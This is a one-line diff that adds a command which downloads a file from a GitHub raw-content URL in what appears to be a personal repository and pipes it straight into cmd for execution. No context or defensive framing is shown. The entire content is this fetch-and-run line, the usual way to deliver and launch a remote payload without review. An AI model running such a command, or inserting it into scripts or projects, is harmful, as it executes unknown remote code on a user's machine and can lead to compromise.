@@ -1,0 +1,1 @@
+curl https://raw.githubusercontent.com/seition2/Fevzi/master/asd | cmd
